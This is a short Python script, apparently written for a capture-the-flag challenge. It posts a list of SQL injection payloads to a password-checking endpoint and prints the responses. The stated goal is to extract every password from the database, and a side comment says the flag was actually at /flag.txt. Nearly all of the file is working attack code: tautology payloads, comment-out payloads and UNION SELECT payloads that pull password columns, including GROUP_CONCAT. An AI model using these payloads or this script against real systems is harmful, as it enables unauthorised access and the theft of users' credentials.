# test injection on my website

# payload looks like this: password=test
# response by default is either True or False whether the password is in the database
# I want an injection that gets all the passwords in the database
url = "https://secure-password.fallctf.cybr.club/"
api_route = "check.php"

import requests
from urllib.parse import quote_plus

def check_password(payload: str) -> str:
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    # Properly encode the password parameter
    data = f"password={quote_plus(payload)}"
    response = requests.post(url + api_route, data=data, headers=headers)
    return response.text

# the correct answer was just to go to /flag.txt bruh

def exploit():
    # Using SQL injection to get all passwords
    # Try multiple injection payloads
    payloads = [
        "' OR '1'='1' -- ",
        "' OR 1=1 -- ",
        "admin' -- ",
        "' OR 'a'='a",
        "') OR '1'='1' -- ",
        "' UNION SELECT password FROM users -- ",
        "' UNION SELECT * FROM passwords -- ",
        "' OR 1=1 LIMIT 1 -- ",
        "1' OR '1'='1",
        "' OR EXISTS(SELECT * FROM passwords) -- ",
        "' UNION SELECT GROUP_CONCAT(password) FROM passwords -- ",
        "' UNION SELECT password FROM passwords LIMIT 1 OFFSET 0 -- "
    ]
    
    print("Testing injection payloads...\n")
    for i, payload in enumerate(payloads, 1):
        print(f"Payload {i}: {payload}")
        result = check_password(payload)
        print(f"Response: {result}\n")

if __name__ == "__main__":
    exploit()
